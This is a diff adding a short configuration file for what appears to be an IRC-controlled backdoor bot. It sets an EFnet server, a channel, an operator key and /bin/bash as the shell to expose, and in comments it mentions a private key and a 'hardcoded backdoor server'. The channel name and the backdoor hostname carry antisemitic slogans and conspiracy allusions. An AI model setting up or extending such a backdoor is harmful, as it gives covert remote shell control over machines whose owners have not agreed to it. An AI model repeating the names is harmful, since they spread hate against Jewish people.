@@ -1,0 +1,18 @@
+[DEFAULT]
+# all options can also be specified on the command line e.g. --host foo.com
+host = irc.efnet.org
+port = 6697
+ssl = True
+botnick = i_am_a_bot
+channel = #thegoyimknow
+#  opmask is only needed if you don't specify opkey
+#opmask = username@unaffiliated/username
+opkey = af29d6a06f9cd83c60740baaf8f5abe1b8dfeceb296c5532958d14a05953490f
+#  don't put your private key into the config you ship...
+#privkey = 685eb46152d265149c1571468c45a530af547722ddbecbe06b4571066afd3fbb
+#  you can use a hardcoded backdoor server, but then you can't change it
+#backdoorserver = nwo.covid19.il
+#  you better make sure the shell exists, /bin/sh is the safe choice
+shell = /bin/bash
+debug = True
+quietpriv = True
